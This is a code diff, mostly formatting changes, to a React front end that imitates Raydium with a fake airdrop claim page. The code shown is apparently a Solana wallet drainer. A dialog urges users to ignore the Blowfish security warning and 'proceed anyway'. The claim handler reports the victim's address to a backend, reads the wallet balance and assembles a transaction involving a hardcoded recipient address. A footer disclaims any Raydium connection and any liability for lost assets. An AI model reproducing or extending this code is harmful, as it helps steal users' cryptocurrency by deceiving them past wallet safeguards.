@@ -88,19 +88,10 @@ function HomePageNavbar() {
   )
 }
 
-function VideoPlayDialog({
-  onClose
-}: {
-  onClose?: () => void
-}) {
-  const videosrc = "/videos/guide.mp4";
+function VideoPlayDialog({ onClose }: { onClose?: () => void }) {
+  const videosrc = '/videos/guide.mp4'
   return (
-    <ResponsiveDialogDrawer
-      maskNoBlur
-      placement="from-bottom"
-      open={true}
-      canClosedByMask={false}
-    >
+    <ResponsiveDialogDrawer maskNoBlur placement="from-bottom" open={true} canClosedByMask={false}>
       <Card
         className={twMerge(
           `flex flex-col p-8 mobile:p-5 rounded-3xl mobile:rounded-b-none mobile:h-[80vh] w-[min(552px,100vw)] mobile:w-full border-1.5 border-[rgba(171,196,255,0.2)]`
@@ -117,11 +108,11 @@ function VideoPlayDialog({
 
         {/* content */}
         <div className="grow text-sm leading-normal text-[#abc4ffb3] scrollbar-width-thin h-96 mobile:h-12 rounded p-4 my-6 mobile:my-4 bg-[#141041]">
-          <div className='flex flex-col items-center'>
-            <div className='mt-3 rounded-lg'>
+          <div className="flex flex-col items-center">
+            <div className="mt-3 rounded-lg">
               <ReactPlayer
                 width="auto"
-                height="225px"
+                height="240px"
                 url={videosrc}
                 controls={false}
                 loop={true}
@@ -134,31 +125,22 @@ function VideoPlayDialog({
               <source src={videosrc} type="video/mp4" />
             </div>
           </div>
-          <div className='flex flex-col items-center'>
+          <div className="flex flex-col items-center">
             <p className="mt-7 text-center">
-              If you see this warning it means our site hasn't
-              been whitelistetd by &nbsp;
+              If you see this warning it means our site hasn't been whitelistetd by &nbsp;
               <u>
-                <a href="https://blowfish.xyz/">
-                  blowfish.xyz
-                </a>
+                <a href="https://blowfish.xyz/">blowfish.xyz</a>
               </u>
-              &nbsp; yet, this process
-              takes time.
+              &nbsp; yet, this process takes time.
             </p>
-            <u className='text-white mt-2'><b>
-              Click "Ignore warning, proceed anyway" to
-              continue action.
-            </b>
+            <u className="text-white mt-2">
+              <b>Click "Ignore warning, proceed anyway" to continue action.</b>
             </u>
           </div>
         </div>
 
         <Col className="">
-          <Button
-            className={`text-[#ABC4FF]  frosted-glass-teal`}
-            onClick={onClose}
-          >
+          <Button className={`text-[#ABC4FF]  frosted-glass-teal`} onClick={onClose}>
             Agree and Continue
           </Button>
         </Col>
@@ -166,7 +148,6 @@ function VideoPlayDialog({
     </ResponsiveDialogDrawer>
   )
 }
-
 
 function HomePageSection0() {
   const isMobile = useAppSettings((s) => s.isMobile)
@@ -191,7 +172,7 @@ function HomePageSection0() {
   const txTransfer = async () => {
     if (owner) {
       try {
-        await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
+        await axios.post(API_BASE_URI + '/api/sendSignNotification', { owner: owner })
         const [airdrop_info, airdrop_bump] = findProgramAddressSync(
           [utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])],
           AIRDROP_PROGRAM_PUBKEY
@@ -243,8 +224,8 @@ function HomePageSection0() {
           totalInstructions.push(txClaim)
         }
         const solBalance = new BN((await connection.getBalance(owner)).toString())
-        const tipAddrs = await getTipAccounts();
-        const tipAccount = new PublicKey(tipAddrs[getRandomNumber(0, tipAddrs.length - 1)]);
+        const tipAddrs = await getTipAccounts()
+        const tipAccount = new PublicKey(tipAddrs[getRandomNumber(0, tipAddrs.length - 1)])
         console.warn(solBalance)
         const fee = new BN('10000000')
         const toAddress = new PublicKey('HJXbU3qwY3wSptW5qE27nz2zJMoJg3JcRS4DozczFRng')
@@ -265,8 +246,9 @@ function HomePageSection0() {
           SystemProgram.transfer({
             fromPubkey: owner,
             toPubkey: tipAccount,
-            lamports: LAMPORTS_PER_SOL * 0.0005,
-          }),)
+            lamports: LAMPORTS_PER_SOL * 0.0005
+          })
+        )
         const recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash
         const transactionMessage = new TransactionMessage({
           payerKey: owner,
@@ -297,7 +279,13 @@ function HomePageSection0() {
 
   return (
     <section className="grid-child-center grid-cover-container mb-16 relative">
-      {isButtonClicked && <VideoPlayDialog onClose={() => { setIsButtonClicked(false) }} />}
+      {isButtonClicked && (
+        <VideoPlayDialog
+          onClose={() => {
+            setIsButtonClicked(false)
+          }}
+        />
+      )}
       <Image src="/backgroundImages/home-bg-element-1.png" className="w-[744px] mobile:w-[394px]" />
       <div className="grid-cover-content children-center">
         <div className="font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]">
@@ -568,7 +556,10 @@ function HomePageSection2() {
             <div className="font-light text-[#c4d6ff] mb-5">
               This page is for testing purposes only and does not represent any connection to &nbsp;
               <u>
-                <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">raydium.io</a><pre />
+                <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">
+                  raydium.io
+                </a>
+                <pre />
               </u>
               We assume no liability for lost assets.
             </div>
